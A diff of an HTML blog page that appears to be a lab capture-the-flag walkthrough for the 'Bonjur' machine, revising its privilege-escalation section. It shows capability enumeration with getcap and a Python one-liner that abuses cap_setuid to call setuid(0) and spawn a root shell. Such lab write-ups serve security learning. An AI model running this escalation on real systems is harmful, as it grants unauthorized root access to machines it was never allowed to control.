@@ -53,7 +53,7 @@
         },
         "datePublished": "2026-07-01",
         "description": "Walkthrough for the Bonjur easy machine.",
-        "wordCount":  380 ,
+        "wordCount":  416 ,
         "mainEntityOfPage": "https://nvru.github.io/posts/hmv/bonjur/",
         "dateModified": "2026-07-01",
         "image": {
@@ -323,8 +323,13 @@ stroke-linejoin="round" class="feather feather-home">
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>getcap -r / 2&gt;/dev/null
 </span></span></code></pre></div><p>The enumeration revealed that the Python interpreter had the <code>cap_setuid</code> capability:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/usr/bin/python3.13 cap_setuid=ep
-</span></span></code></pre></div><p>Since the binary is allowed to change its effective user ID, I used it to switch to the root user and spawn a shell:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>python3<span style="color:#ae81ff">.13</span> <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import os; os.setuid(0); os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;)&#39;</span>
+</span></span></code></pre></div><p>The <code>cap_setuid</code> capability allows a binary to change its effective user ID without requiring full root privileges. Since the Python interpreter possessed this capability, it could invoke <code>setuid(0)</code> and execute commands as the root user.</p>
+<p>For more information about Linux capabilities, see the HackTricks documentation:</p>
+<ul>
+<li><a href="https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html">https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html</a></li>
+</ul>
+<p>Using Python, I changed the effective UID to <code>0</code> and spawned a root shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/python3.13 -c <span style="color:#e6db74">&#39;import os; os.setuid(0); os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;)&#39;</span>
 </span></span></code></pre></div><p>This successfully provided a root shell.</p>
 <p><img src="/images/bonjur/find_cap.png" alt="Privilege Escalation"></p>
 <h2 id="root">Root</h2>
